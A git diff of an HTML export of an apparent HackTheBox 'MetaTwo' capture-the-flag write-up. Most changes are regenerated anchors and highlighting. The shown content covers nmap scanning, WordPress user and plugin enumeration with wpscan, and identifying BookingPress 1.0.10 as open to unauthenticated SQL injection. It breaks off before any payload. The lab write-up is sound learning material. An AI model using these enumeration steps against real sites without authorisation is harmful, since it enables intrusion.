@@ -3,7 +3,7 @@
 "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
 <html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
 <head>
-<!-- 2023-07-14 Fri 07:43 -->
+<!-- 2023-07-14 Fri 07:50 -->
 <meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>MetaTwo</title>
@@ -30,13 +30,13 @@
 <h2>Table of Contents</h2>
 <div id="text-table-of-contents" role="doc-toc">
 <ul>
-<li><a href="#org6fd392c">MetaTwo</a>
+<li><a href="#org10edba9">MetaTwo</a>
 <ul>
-<li><a href="#orgb70df2c">Nmap Scan</a></li>
-<li><a href="#org572181a">HTTP service</a>
+<li><a href="#orge1145bc">Nmap Scan</a></li>
+<li><a href="#org2f3dc8e">HTTP service</a>
 <ul>
-<li><a href="#org53332db">Wordpress Enumeration</a></li>
-<li><a href="#org8142e47">BookingPress investigation&#xa0;&#xa0;&#xa0;<span class="tag"><span class="sqli">sqli</span></span></a></li>
+<li><a href="#org62d5fa3">Wordpress Enumeration</a></li>
+<li><a href="#orgf2c2da9">BookingPress investigation&#xa0;&#xa0;&#xa0;<span class="tag"><span class="sqli">sqli</span></span></a></li>
 </ul>
 </li>
 </ul>
@@ -47,18 +47,18 @@
 <ul class="org-ul">
 <li><a href="../index.html#ID-c72d4e02-0e32-424c-b4b3-c471adbf4598">Index</a></li>
 </ul>
-<div id="outline-container-org6fd392c" class="outline-2">
-<h2 id="org6fd392c">MetaTwo</h2>
-<div class="outline-text-2" id="text-org6fd392c">
+<div id="outline-container-org10edba9" class="outline-2">
+<h2 id="org10edba9">MetaTwo</h2>
+<div class="outline-text-2" id="text-org10edba9">
 <p>
 I start out by scanning the host
 </p>
 </div>
 
-<div id="outline-container-orgb70df2c" class="outline-3">
-<h3 id="orgb70df2c">Nmap Scan</h3>
-<div class="outline-text-3" id="text-orgb70df2c">
-<pre class="example" id="org22c3d5d">
+<div id="outline-container-orge1145bc" class="outline-3">
+<h3 id="orge1145bc">Nmap Scan</h3>
+<div class="outline-text-3" id="text-orge1145bc">
+<pre class="example" id="orgb56cc86">
 # Nmap 7.92 scan initiated Wed Nov  2 23:56:39 2022 as: nmap -A -oA scans/10.10.11.186 10.10.11.186
 Nmap scan report for 10.10.11.186
 Host is up (0.034s latency).
@@ -103,27 +103,27 @@ from the nmap scan you see there is a hostname <code>metapress.htb</code>. put t
 </div>
 </div>
 
-<div id="outline-container-org572181a" class="outline-3">
-<h3 id="org572181a">HTTP service</h3>
-<div class="outline-text-3" id="text-org572181a">
+<div id="outline-container-org2f3dc8e" class="outline-3">
+<h3 id="org2f3dc8e">HTTP service</h3>
+<div class="outline-text-3" id="text-org2f3dc8e">
 <p>
 On the http service there is a wordpress install.
 </p>
 
 
-<div id="orgc201f0d" class="figure">
+<div id="org0f13380" class="figure">
 <p><img src="MetaTwo/2022-12-13_18-34-32_screenshot.png" alt="2022-12-13_18-34-32_screenshot.png" />
 </p>
 </div>
 </div>
 
-<div id="outline-container-org53332db" class="outline-4">
-<h4 id="org53332db">Wordpress Enumeration</h4>
-<div class="outline-text-4" id="text-org53332db">
+<div id="outline-container-org62d5fa3" class="outline-4">
+<h4 id="org62d5fa3">Wordpress Enumeration</h4>
+<div class="outline-text-4" id="text-org62d5fa3">
 </div>
 <ul class="org-ul">
-<li><a id="org19eda2c"></a>Username enumeration<br />
-<div class="outline-text-5" id="text-org19eda2c">
+<li><a id="org8de5ca7"></a>Username enumeration<br />
+<div class="outline-text-5" id="text-org8de5ca7">
 <p>
 First thing i try is searching by the author tag, i dont see any
 </p>
@@ -131,13 +131,13 @@ First thing i try is searching by the author tag, i dont see any
 <p>
 Going to
 </p>
-<pre class="example" id="org7e4ea8c">
+<pre class="example" id="orge3d0847">
 http://metapress.htb/?author=1
 </pre>
 <p>
 Takes me to
 </p>
-<pre class="example" id="org6a594aa">
+<pre class="example" id="org6766cdc">
 http://metapress.htb/author/admin/
 </pre>
 <p>
@@ -147,35 +147,35 @@ So admin user is named <code>admin</code>.
 <p>
 I want to be sure there is no other users so i check the wp-json api
 </p>
-<pre class="example" id="org979d857">
+<pre class="example" id="org178b033">
 http://metapress.htb/wp-json/wp/v2/users
 </pre>
 
 <div class="org-src-container">
 <pre class="src src-json">[
   {
-    <span style="color: #ff2afc; font-weight: bold;">"id"</span>: <span style="color: #ffd400; font-weight: bold;">1</span>,
-    <span style="color: #ff2afc; font-weight: bold;">"name"</span>: <span style="color: #7984D1;">"admin"</span>,
-    <span style="color: #ff2afc; font-weight: bold;">"url"</span>: <span style="color: #7984D1;">"http://metapress.htb"</span>,
-    <span style="color: #ff2afc; font-weight: bold;">"description"</span>: <span style="color: #7984D1;">""</span>,
-    <span style="color: #ff2afc; font-weight: bold;">"link"</span>: <span style="color: #7984D1;">"http://metapress.htb/author/admin/"</span>,
-    <span style="color: #ff2afc; font-weight: bold;">"slug"</span>: <span style="color: #7984D1;">"admin"</span>,
-    <span style="color: #ff2afc; font-weight: bold;">"avatar_urls"</span>: {
-      <span style="color: #ff2afc; font-weight: bold;">"24"</span>: <span style="color: #7984D1;">"http://2.gravatar.com/avatar/816499be5007457d126357a63115cd9c?s=24&amp;d=mm&amp;r=g"</span>,
-      <span style="color: #ff2afc; font-weight: bold;">"48"</span>: <span style="color: #7984D1;">"http://2.gravatar.com/avatar/816499be5007457d126357a63115cd9c?s=48&amp;d=mm&amp;r=g"</span>,
-      <span style="color: #ff2afc; font-weight: bold;">"96"</span>: <span style="color: #7984D1;">"http://2.gravatar.com/avatar/816499be5007457d126357a63115cd9c?s=96&amp;d=mm&amp;r=g"</span>
+    "id": 1,
+    "name": "admin",
+    "url": "http://metapress.htb",
+    "description": "",
+    "link": "http://metapress.htb/author/admin/",
+    "slug": "admin",
+    "avatar_urls": {
+      "24": "http://2.gravatar.com/avatar/816499be5007457d126357a63115cd9c?s=24&amp;d=mm&amp;r=g",
+      "48": "http://2.gravatar.com/avatar/816499be5007457d126357a63115cd9c?s=48&amp;d=mm&amp;r=g",
+      "96": "http://2.gravatar.com/avatar/816499be5007457d126357a63115cd9c?s=96&amp;d=mm&amp;r=g"
     },
-    <span style="color: #ff2afc; font-weight: bold;">"meta"</span>: [],
-    <span style="color: #ff2afc; font-weight: bold;">"_links"</span>: {
-      <span style="color: #ff2afc; font-weight: bold;">"self"</span>: [
-        {
-          <span style="color: #ff2afc; font-weight: bold;">"href"</span>: <span style="color: #7984D1;">"http://metapress.htb/wp-json/wp/v2/users/1"</span>
-        }
+    "meta": [],
+    "_links": {
+      "self": [
+	{
+	  "href": "http://metapress.htb/wp-json/wp/v2/users/1"
+	}
       ],
-      <span style="color: #ff2afc; font-weight: bold;">"collection"</span>: [
-        {
-          <span style="color: #ff2afc; font-weight: bold;">"href"</span>: <span style="color: #7984D1;">"http://metapress.htb/wp-json/wp/v2/users"</span>
-        }
+      "collection": [
+	{
+	  "href": "http://metapress.htb/wp-json/wp/v2/users"
+	}
       ]
     }
   }
@@ -188,13 +188,13 @@ Looks like its just admin user
 </div>
 </li>
 
-<li><a id="org0d10a95"></a>Wpscan<br />
-<div class="outline-text-5" id="text-org0d10a95">
+<li><a id="org833d0bf"></a>Wpscan<br />
+<div class="outline-text-5" id="text-org833d0bf">
 <p>
 So after i find out what users are on the box i start wpscan.
 </p>
 
-<pre class="example" id="org7788753">
+<pre class="example" id="org5ca2097">
 _______________________________________________________________
          __          _______   _____
          \ \        / /  __ \ / ____|
@@ -273,8 +273,8 @@ Wp scan has found some usfule things like the fact <code>/readme.html</code> is 
 </p>
 </div>
 </li>
-<li><a id="org84ab3f0"></a>Readme.html<br />
-<div class="outline-text-5" id="text-org84ab3f0">
+<li><a id="orgfc1b735"></a>Readme.html<br />
+<div class="outline-text-5" id="text-orgfc1b735">
 <p>
 Checking the readme.html should be done whever you see it, it contains helpful info.
 </p>
@@ -285,8 +285,8 @@ In this case i dont see much here
 </div>
 </li>
 
-<li><a id="orgfe3d7a8"></a>Plugin enumeration<br />
-<div class="outline-text-5" id="text-orgfe3d7a8">
+<li><a id="org928cf04"></a>Plugin enumeration<br />
+<div class="outline-text-5" id="text-org928cf04">
 <p>
 Now wpscan did a poor job of finding plugins (maybe i should make my own?)
 </p>
@@ -298,12 +298,12 @@ The best way is to check the html source
 </div>
 
 <ul class="org-ul">
-<li><a id="org5b4d769"></a>Checking the Html Source<br />
-<div class="outline-text-6" id="text-org5b4d769">
+<li><a id="orgc541d7c"></a>Checking the Html Source<br />
+<div class="outline-text-6" id="text-orgc541d7c">
 <p>
 Checking the source I find the theme is called <code>twentytwentyone</code> version 1.1
 </p>
-<pre class="example" id="orge9d3ed6">
+<pre class="example" id="org717b1a5">
 http://metapress.htb/wp-content/themes/twentytwentyone/assets/css/print.css?ver=1.1
 </pre>
 <p>
@@ -317,34 +317,34 @@ Going to the event booker and checking the source:
 </p>
 
 <div class="org-src-container">
-<pre class="src src-html">&lt;<span style="color: #42c6ff;">head</span>&gt;
-    &lt;<span style="color: #42c6ff;">meta</span> <span style="color: #df85ff;">charset</span>=<span style="color: #7984D1;">"UTF-8"</span>&gt;
-    &lt;<span style="color: #42c6ff;">meta</span> <span style="color: #df85ff;">name</span>=<span style="color: #7984D1;">"viewport"</span> <span style="color: #df85ff;">content</span>=<span style="color: #7984D1;">"width=device-width, initial-scale=1"</span>&gt;
-    &lt;<span style="color: #42c6ff;">title</span>&gt;<span style="font-weight: bold; text-decoration: underline;">Events &#8211; MetaPress</span>&lt;/<span style="color: #42c6ff;">title</span>&gt;
-&lt;<span style="color: #42c6ff;">link</span> <span style="color: #df85ff;">rel</span>=<span style="color: #7984D1;">"dns-prefetch"</span> <span style="color: #df85ff;">href</span>=<span style="color: #7984D1;">"//metapress.htb"</span>&gt;
-&lt;<span style="color: #42c6ff;">link</span> <span style="color: #df85ff;">rel</span>=<span style="color: #7984D1;">"dns-prefetch"</span> <span style="color: #df85ff;">href</span>=<span style="color: #7984D1;">"//s.w.org"</span>&gt;
-&lt;<span style="color: #42c6ff;">link</span> <span style="color: #df85ff;">rel</span>=<span style="color: #7984D1;">"alternate"</span> <span style="color: #df85ff;">type</span>=<span style="color: #7984D1;">"application/rss+xml"</span> <span style="color: #df85ff;">title</span>=<span style="color: #7984D1;">"MetaPress &#187; Feed"</span> <span style="color: #df85ff;">href</span>=<span style="color: #7984D1;">"http://metapress.htb/feed/"</span>&gt;
-&lt;<span style="color: #42c6ff;">link</span> <span style="color: #df85ff;">rel</span>=<span style="color: #7984D1;">"alternate"</span> <span style="color: #df85ff;">type</span>=<span style="color: #7984D1;">"application/rss+xml"</span> <span style="color: #df85ff;">title</span>=<span style="color: #7984D1;">"MetaPress &#187; Comments Feed"</span> <span style="color: #df85ff;">href</span>=<span style="color: #7984D1;">"http://metapress.htb/comments/feed/"</span>&gt;
-&lt;<span style="color: #42c6ff;">link</span> <span style="color: #df85ff;">rel</span>=<span style="color: #7984D1;">"stylesheet"</span> <span style="color: #df85ff;">id</span>=<span style="color: #7984D1;">"twenty-twenty-one-style-css"</span> <span style="color: #df85ff;">href</span>=<span style="color: #7984D1;">"http://metapress.htb/wp-content/themes/twentytwentyone/style.css?ver=1.1"</span> <span style="color: #df85ff;">media</span>=<span style="color: #7984D1;">"all"</span>&gt;
-&lt;<span style="color: #42c6ff;">link</span> <span style="color: #df85ff;">rel</span>=<span style="color: #7984D1;">"stylesheet"</span> <span style="color: #df85ff;">id</span>=<span style="color: #7984D1;">"twenty-twenty-one-print-style-css"</span> <span style="color: #df85ff;">href</span>=<span style="color: #7984D1;">"http://metapress.htb/wp-content/themes/twentytwentyone/assets/css/print.css?ver=1.1"</span> <span style="color: #df85ff;">media</span>=<span style="color: #7984D1;">"print"</span>&gt;
-&lt;<span style="color: #42c6ff;">link</span> <span style="color: #df85ff;">rel</span>=<span style="color: #7984D1;">"stylesheet"</span> <span style="color: #df85ff;">id</span>=<span style="color: #7984D1;">"bookingpress_element_css-css"</span> <span style="color: #df85ff;">href</span>=<span style="color: #7984D1;">"http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/css/bookingpress_element_theme.css?ver=1.0.10"</span> <span style="color: #df85ff;">media</span>=<span style="color: #7984D1;">"all"</span>&gt;
-&lt;<span style="color: #42c6ff;">link</span> <span style="color: #df85ff;">rel</span>=<span style="color: #7984D1;">"stylesheet"</span> <span style="color: #df85ff;">id</span>=<span style="color: #7984D1;">"bookingpress_fonts_css-css"</span> <span style="color: #df85ff;">href</span>=<span style="color: #7984D1;">"http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/css/fonts/fonts.css?ver=1.0.10"</span> <span style="color: #df85ff;">media</span>=<span style="color: #7984D1;">"all"</span>&gt;
-&lt;<span style="color: #42c6ff;">link</span> <span style="color: #df85ff;">rel</span>=<span style="color: #7984D1;">"stylesheet"</span> <span style="color: #df85ff;">id</span>=<span style="color: #7984D1;">"bookingpress_front_css-css"</span> <span style="color: #df85ff;">href</span>=<span style="color: #7984D1;">"http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/css/bookingpress_front.css?ver=1.0.10"</span> <span style="color: #df85ff;">media</span>=<span style="color: #7984D1;">"all"</span>&gt;
-&lt;<span style="color: #42c6ff;">link</span> <span style="color: #df85ff;">rel</span>=<span style="color: #7984D1;">"stylesheet"</span> <span style="color: #df85ff;">id</span>=<span style="color: #7984D1;">"bookingpress_tel_input-css"</span> <span style="color: #df85ff;">href</span>=<span style="color: #7984D1;">"http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/css/bookingpress_tel_input.css?ver=1.0.10"</span> <span style="color: #df85ff;">media</span>=<span style="color: #7984D1;">"all"</span>&gt;
-&lt;<span style="color: #42c6ff;">link</span> <span style="color: #df85ff;">rel</span>=<span style="color: #7984D1;">"stylesheet"</span> <span style="color: #df85ff;">id</span>=<span style="color: #7984D1;">"bookingpress_calendar_css-css"</span> <span style="color: #df85ff;">href</span>=<span style="color: #7984D1;">"http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/css/bookingpress_vue_calendar.css?ver=1.0.10"</span> <span style="color: #df85ff;">media</span>=<span style="color: #7984D1;">"all"</span>&gt;
-&lt;<span style="color: #42c6ff;">script</span> <span style="color: #df85ff;">id</span>=<span style="color: #7984D1;">"bookingpress_vue_js-js-extra"</span>&gt;
+<pre class="src src-html">&lt;<span style="font-weight: bold;">head</span>&gt;
+        &lt;<span style="font-weight: bold;">meta</span> <span style="font-weight: bold; font-style: italic;">charset</span>=<span style="font-style: italic;">"UTF-8"</span>&gt;
+        &lt;<span style="font-weight: bold;">meta</span> <span style="font-weight: bold; font-style: italic;">name</span>=<span style="font-style: italic;">"viewport"</span> <span style="font-weight: bold; font-style: italic;">content</span>=<span style="font-style: italic;">"width=device-width, initial-scale=1"</span>&gt;
+        &lt;<span style="font-weight: bold;">title</span>&gt;<span style="font-weight: bold; text-decoration: underline;">Events &#8211; MetaPress</span>&lt;/<span style="font-weight: bold;">title</span>&gt;
+&lt;<span style="font-weight: bold;">link</span> <span style="font-weight: bold; font-style: italic;">rel</span>=<span style="font-style: italic;">"dns-prefetch"</span> <span style="font-weight: bold; font-style: italic;">href</span>=<span style="font-style: italic;">"//metapress.htb"</span>&gt;
+&lt;<span style="font-weight: bold;">link</span> <span style="font-weight: bold; font-style: italic;">rel</span>=<span style="font-style: italic;">"dns-prefetch"</span> <span style="font-weight: bold; font-style: italic;">href</span>=<span style="font-style: italic;">"//s.w.org"</span>&gt;
+&lt;<span style="font-weight: bold;">link</span> <span style="font-weight: bold; font-style: italic;">rel</span>=<span style="font-style: italic;">"alternate"</span> <span style="font-weight: bold; font-style: italic;">type</span>=<span style="font-style: italic;">"application/rss+xml"</span> <span style="font-weight: bold; font-style: italic;">title</span>=<span style="font-style: italic;">"MetaPress &#187; Feed"</span> <span style="font-weight: bold; font-style: italic;">href</span>=<span style="font-style: italic;">"http://metapress.htb/feed/"</span>&gt;
+&lt;<span style="font-weight: bold;">link</span> <span style="font-weight: bold; font-style: italic;">rel</span>=<span style="font-style: italic;">"alternate"</span> <span style="font-weight: bold; font-style: italic;">type</span>=<span style="font-style: italic;">"application/rss+xml"</span> <span style="font-weight: bold; font-style: italic;">title</span>=<span style="font-style: italic;">"MetaPress &#187; Comments Feed"</span> <span style="font-weight: bold; font-style: italic;">href</span>=<span style="font-style: italic;">"http://metapress.htb/comments/feed/"</span>&gt;
+&lt;<span style="font-weight: bold;">link</span> <span style="font-weight: bold; font-style: italic;">rel</span>=<span style="font-style: italic;">"stylesheet"</span> <span style="font-weight: bold; font-style: italic;">id</span>=<span style="font-style: italic;">"twenty-twenty-one-style-css"</span> <span style="font-weight: bold; font-style: italic;">href</span>=<span style="font-style: italic;">"http://metapress.htb/wp-content/themes/twentytwentyone/style.css?ver=1.1"</span> <span style="font-weight: bold; font-style: italic;">media</span>=<span style="font-style: italic;">"all"</span>&gt;
+&lt;<span style="font-weight: bold;">link</span> <span style="font-weight: bold; font-style: italic;">rel</span>=<span style="font-style: italic;">"stylesheet"</span> <span style="font-weight: bold; font-style: italic;">id</span>=<span style="font-style: italic;">"twenty-twenty-one-print-style-css"</span> <span style="font-weight: bold; font-style: italic;">href</span>=<span style="font-style: italic;">"http://metapress.htb/wp-content/themes/twentytwentyone/assets/css/print.css?ver=1.1"</span> <span style="font-weight: bold; font-style: italic;">media</span>=<span style="font-style: italic;">"print"</span>&gt;
+&lt;<span style="font-weight: bold;">link</span> <span style="font-weight: bold; font-style: italic;">rel</span>=<span style="font-style: italic;">"stylesheet"</span> <span style="font-weight: bold; font-style: italic;">id</span>=<span style="font-style: italic;">"bookingpress_element_css-css"</span> <span style="font-weight: bold; font-style: italic;">href</span>=<span style="font-style: italic;">"http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/css/bookingpress_element_theme.css?ver=1.0.10"</span> <span style="font-weight: bold; font-style: italic;">media</span>=<span style="font-style: italic;">"all"</span>&gt;
+&lt;<span style="font-weight: bold;">link</span> <span style="font-weight: bold; font-style: italic;">rel</span>=<span style="font-style: italic;">"stylesheet"</span> <span style="font-weight: bold; font-style: italic;">id</span>=<span style="font-style: italic;">"bookingpress_fonts_css-css"</span> <span style="font-weight: bold; font-style: italic;">href</span>=<span style="font-style: italic;">"http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/css/fonts/fonts.css?ver=1.0.10"</span> <span style="font-weight: bold; font-style: italic;">media</span>=<span style="font-style: italic;">"all"</span>&gt;
+&lt;<span style="font-weight: bold;">link</span> <span style="font-weight: bold; font-style: italic;">rel</span>=<span style="font-style: italic;">"stylesheet"</span> <span style="font-weight: bold; font-style: italic;">id</span>=<span style="font-style: italic;">"bookingpress_front_css-css"</span> <span style="font-weight: bold; font-style: italic;">href</span>=<span style="font-style: italic;">"http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/css/bookingpress_front.css?ver=1.0.10"</span> <span style="font-weight: bold; font-style: italic;">media</span>=<span style="font-style: italic;">"all"</span>&gt;
+&lt;<span style="font-weight: bold;">link</span> <span style="font-weight: bold; font-style: italic;">rel</span>=<span style="font-style: italic;">"stylesheet"</span> <span style="font-weight: bold; font-style: italic;">id</span>=<span style="font-style: italic;">"bookingpress_tel_input-css"</span> <span style="font-weight: bold; font-style: italic;">href</span>=<span style="font-style: italic;">"http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/css/bookingpress_tel_input.css?ver=1.0.10"</span> <span style="font-weight: bold; font-style: italic;">media</span>=<span style="font-style: italic;">"all"</span>&gt;
+&lt;<span style="font-weight: bold;">link</span> <span style="font-weight: bold; font-style: italic;">rel</span>=<span style="font-style: italic;">"stylesheet"</span> <span style="font-weight: bold; font-style: italic;">id</span>=<span style="font-style: italic;">"bookingpress_calendar_css-css"</span> <span style="font-weight: bold; font-style: italic;">href</span>=<span style="font-style: italic;">"http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/css/bookingpress_vue_calendar.css?ver=1.0.10"</span> <span style="font-weight: bold; font-style: italic;">media</span>=<span style="font-style: italic;">"all"</span>&gt;
+&lt;<span style="font-weight: bold;">script</span> <span style="font-weight: bold; font-style: italic;">id</span>=<span style="font-style: italic;">"bookingpress_vue_js-js-extra"</span>&gt;
 var appoint_ajax_obj = {"ajax_url":"http:\/\/metapress.htb\/wp-admin\/admin-ajax.php"};
-&lt;/<span style="color: #42c6ff;">script</span>&gt;
-&lt;<span style="color: #42c6ff;">script</span> <span style="color: #df85ff;">data-cfasync</span>=<span style="color: #7984D1;">"false"</span> <span style="color: #df85ff;">src</span>=<span style="color: #7984D1;">"http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/js/bookingpress_vue.min.js?ver=1.0.10"</span> <span style="color: #df85ff;">id</span>=<span style="color: #7984D1;">"bookingpress_vue_js-js"</span>&gt;&lt;/<span style="color: #42c6ff;">script</span>&gt;
-&lt;<span style="color: #42c6ff;">script</span> <span style="color: #df85ff;">data-cfasync</span>=<span style="color: #7984D1;">"false"</span> <span style="color: #df85ff;">src</span>=<span style="color: #7984D1;">"http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/js/bookingpress_axios.min.js?ver=1.0.10"</span> <span style="color: #df85ff;">id</span>=<span style="color: #7984D1;">"bookingpress_axios_js-js"</span>&gt;&lt;/<span style="color: #42c6ff;">script</span>&gt;
-&lt;<span style="color: #42c6ff;">script</span> <span style="color: #df85ff;">data-cfasync</span>=<span style="color: #7984D1;">"false"</span> <span style="color: #df85ff;">src</span>=<span style="color: #7984D1;">"http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/js/bookingpress_wordpress_vue_qs_helper.js?ver=1.0.10"</span> <span style="color: #df85ff;">id</span>=<span style="color: #7984D1;">"bookingpress_wordpress_vue_helper_js-js"</span>&gt;&lt;/<span style="color: #42c6ff;">script</span>&gt;
-&lt;<span style="color: #42c6ff;">script</span> <span style="color: #df85ff;">data-cfasync</span>=<span style="color: #7984D1;">"false"</span> <span style="color: #df85ff;">src</span>=<span style="color: #7984D1;">"http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/js/bookingpress_element.js?ver=1.0.10"</span> <span style="color: #df85ff;">id</span>=<span style="color: #7984D1;">"bookingpress_element_js-js"</span>&gt;&lt;/<span style="color: #42c6ff;">script</span>&gt;
-&lt;<span style="color: #42c6ff;">script</span> <span style="color: #df85ff;">data-cfasync</span>=<span style="color: #7984D1;">"false"</span> <span style="color: #df85ff;">src</span>=<span style="color: #7984D1;">"http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/js/bookingpress_vue_calendar.js?ver=1.0.10"</span> <span style="color: #df85ff;">id</span>=<span style="color: #7984D1;">"bookingpress_calendar_js-js"</span>&gt;&lt;/<span style="color: #42c6ff;">script</span>&gt;
-&lt;<span style="color: #42c6ff;">script</span> <span style="color: #df85ff;">data-cfasync</span>=<span style="color: #7984D1;">"false"</span> <span style="color: #df85ff;">src</span>=<span style="color: #7984D1;">"http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/js/bookingpress_moment.min.js?ver=1.0.10"</span> <span style="color: #df85ff;">id</span>=<span style="color: #7984D1;">"bookingpress_moment_js-js"</span>&gt;&lt;/<span style="color: #42c6ff;">script</span>&gt;
-&lt;<span style="color: #42c6ff;">script</span> <span style="color: #df85ff;">data-cfasync</span>=<span style="color: #7984D1;">"false"</span> <span style="color: #df85ff;">src</span>=<span style="color: #7984D1;">"http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/js/bookingpress_tel_input.js?ver=1.0.10"</span> <span style="color: #df85ff;">id</span>=<span style="color: #7984D1;">"bookingpress_tel_input_js-js"</span>&gt;&lt;/<span style="color: #42c6ff;">script</span>&gt;
-&lt;<span style="color: #42c6ff;">script</span> <span style="color: #df85ff;">data-cfasync</span>=<span style="color: #7984D1;">"false"</span> <span style="color: #df85ff;">src</span>=<span style="color: #7984D1;">"http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/js/bookingpress_element_en.js?ver=1.0.10"</span> <span style="color: #df85ff;">id</span>=<span style="color: #7984D1;">"bookingpress_element_en_js-js"</span>&gt;&lt;/<span style="color: #42c6ff;">script</span>&gt;
+&lt;/<span style="font-weight: bold;">script</span>&gt;
+&lt;<span style="font-weight: bold;">script</span> <span style="font-weight: bold; font-style: italic;">data-cfasync</span>=<span style="font-style: italic;">"false"</span> <span style="font-weight: bold; font-style: italic;">src</span>=<span style="font-style: italic;">"http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/js/bookingpress_vue.min.js?ver=1.0.10"</span> <span style="font-weight: bold; font-style: italic;">id</span>=<span style="font-style: italic;">"bookingpress_vue_js-js"</span>&gt;&lt;/<span style="font-weight: bold;">script</span>&gt;
+&lt;<span style="font-weight: bold;">script</span> <span style="font-weight: bold; font-style: italic;">data-cfasync</span>=<span style="font-style: italic;">"false"</span> <span style="font-weight: bold; font-style: italic;">src</span>=<span style="font-style: italic;">"http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/js/bookingpress_axios.min.js?ver=1.0.10"</span> <span style="font-weight: bold; font-style: italic;">id</span>=<span style="font-style: italic;">"bookingpress_axios_js-js"</span>&gt;&lt;/<span style="font-weight: bold;">script</span>&gt;
+&lt;<span style="font-weight: bold;">script</span> <span style="font-weight: bold; font-style: italic;">data-cfasync</span>=<span style="font-style: italic;">"false"</span> <span style="font-weight: bold; font-style: italic;">src</span>=<span style="font-style: italic;">"http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/js/bookingpress_wordpress_vue_qs_helper.js?ver=1.0.10"</span> <span style="font-weight: bold; font-style: italic;">id</span>=<span style="font-style: italic;">"bookingpress_wordpress_vue_helper_js-js"</span>&gt;&lt;/<span style="font-weight: bold;">script</span>&gt;
+&lt;<span style="font-weight: bold;">script</span> <span style="font-weight: bold; font-style: italic;">data-cfasync</span>=<span style="font-style: italic;">"false"</span> <span style="font-weight: bold; font-style: italic;">src</span>=<span style="font-style: italic;">"http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/js/bookingpress_element.js?ver=1.0.10"</span> <span style="font-weight: bold; font-style: italic;">id</span>=<span style="font-style: italic;">"bookingpress_element_js-js"</span>&gt;&lt;/<span style="font-weight: bold;">script</span>&gt;
+&lt;<span style="font-weight: bold;">script</span> <span style="font-weight: bold; font-style: italic;">data-cfasync</span>=<span style="font-style: italic;">"false"</span> <span style="font-weight: bold; font-style: italic;">src</span>=<span style="font-style: italic;">"http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/js/bookingpress_vue_calendar.js?ver=1.0.10"</span> <span style="font-weight: bold; font-style: italic;">id</span>=<span style="font-style: italic;">"bookingpress_calendar_js-js"</span>&gt;&lt;/<span style="font-weight: bold;">script</span>&gt;
+&lt;<span style="font-weight: bold;">script</span> <span style="font-weight: bold; font-style: italic;">data-cfasync</span>=<span style="font-style: italic;">"false"</span> <span style="font-weight: bold; font-style: italic;">src</span>=<span style="font-style: italic;">"http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/js/bookingpress_moment.min.js?ver=1.0.10"</span> <span style="font-weight: bold; font-style: italic;">id</span>=<span style="font-style: italic;">"bookingpress_moment_js-js"</span>&gt;&lt;/<span style="font-weight: bold;">script</span>&gt;
+&lt;<span style="font-weight: bold;">script</span> <span style="font-weight: bold; font-style: italic;">data-cfasync</span>=<span style="font-style: italic;">"false"</span> <span style="font-weight: bold; font-style: italic;">src</span>=<span style="font-style: italic;">"http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/js/bookingpress_tel_input.js?ver=1.0.10"</span> <span style="font-weight: bold; font-style: italic;">id</span>=<span style="font-style: italic;">"bookingpress_tel_input_js-js"</span>&gt;&lt;/<span style="font-weight: bold;">script</span>&gt;
+&lt;<span style="font-weight: bold;">script</span> <span style="font-weight: bold; font-style: italic;">data-cfasync</span>=<span style="font-style: italic;">"false"</span> <span style="font-weight: bold; font-style: italic;">src</span>=<span style="font-style: italic;">"http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/js/bookingpress_element_en.js?ver=1.0.10"</span> <span style="font-weight: bold; font-style: italic;">id</span>=<span style="font-style: italic;">"bookingpress_element_en_js-js"</span>&gt;&lt;/<span style="font-weight: bold;">script</span>&gt;
 
-&lt;/<span style="color: #42c6ff;">head</span>&gt;
+&lt;/<span style="font-weight: bold;">head</span>&gt;
 </pre>
 </div>
 <p>
@@ -357,31 +357,30 @@ I cut down on all the extra stuff, what you can see out of this, is that there i
 </ul>
 </div>
 
-<div id="outline-container-org8142e47" class="outline-4">
-<h4 id="org8142e47">BookingPress investigation&#xa0;&#xa0;&#xa0;<span class="tag"><span class="sqli">sqli</span></span></h4>
-<div class="outline-text-4" id="text-org8142e47">
+<div id="outline-container-orgf2c2da9" class="outline-4">
+<h4 id="orgf2c2da9">BookingPress investigation&#xa0;&#xa0;&#xa0;<span class="tag"><span class="sqli">sqli</span></span></h4>
+<div class="outline-text-4" id="text-orgf2c2da9">
 <p>
 Searching bookingpress right away shows that it is vulnerable to a unauthenticated <a href="20221213185522-sql_injection.html#ID-81d62666-4ce8-4244-b498-739a680f9673">SQL Injection</a>.
 </p>
 </div>
 <ul class="org-ul">
-<li><a id="org80ac1f7"></a>BookingPress &lt; 1.0.11 - Unauthenticated SQL Injection<br />
-<div class="outline-text-5" id="text-org80ac1f7">
+<li><a id="org6d58d04"></a>BookingPress &lt; 1.0.11 - Unauthenticated SQL Injection<br />
+<div class="outline-text-5" id="text-org6d58d04">
 <p>
 Description
 </p>
 
-<div class="org-src-container">
